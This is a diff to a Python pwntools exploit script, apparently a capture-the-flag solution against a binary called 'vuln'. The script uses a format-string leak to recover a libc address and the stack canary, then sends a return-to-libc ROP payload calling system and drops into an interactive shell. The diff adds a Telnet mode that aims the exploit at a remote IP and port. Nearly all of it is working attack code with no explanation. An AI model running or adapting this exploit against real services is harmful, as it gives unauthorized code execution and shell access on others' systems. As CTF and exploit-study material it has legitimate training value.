@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 from pwn import *
+from telnetlib import Telnet
 
 shift_pie = 0x0#0x56b0
 shift_libc = 0x114A37
@@ -8,13 +9,35 @@ ret_offset = 8
 pop_rdi = 0x000000000002a3e5
 ret = 0x0000000000029cd6
 
-e = ELF('vuln')
+network = False
+io = None
+write = None
+receive = None
+
+if network:
+        ip = input("[i] Enter target ip (localhost): ")	#ask target ip
+        ip = ip.strip()
+        if not ip:
+                ip = 'localhost'				#default target ip
+        port = input("[i] Enter target port (5555): ")	#ask target port
+        port = port.strip()
+        if not port:
+                port = 5555					#default target port
+        print("[i] Connecting to server")
+        io = Telnet(ip, int(port))
+        write = io.write
+        receive = lambda: io.read_until(b'\n')
+else:
+        e = ELF('vuln')
+        io = e.process()
+        write = io.sendline
+        receive = io.recvline
+
 libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
-io = e.process()
  
-io.sendline('%3$lx-%11$lx')
-io.recvline()
-leak = io.recvline()
+write(b'%3$lx-%11$lx')
+receive()
+leak = receive()
 libc.address = int(leak.strip().split(b'-')[0], 16) - shift_libc
 canary = int(leak.strip().split(b'-')[1], 16)
  
@@ -33,5 +56,5 @@ payload = flat(
         libc.sym['system'],
         endianness = 'little', word_size = 64, sign = False)
  
-io.sendline(payload)
+write(payload)
 io.interactive()
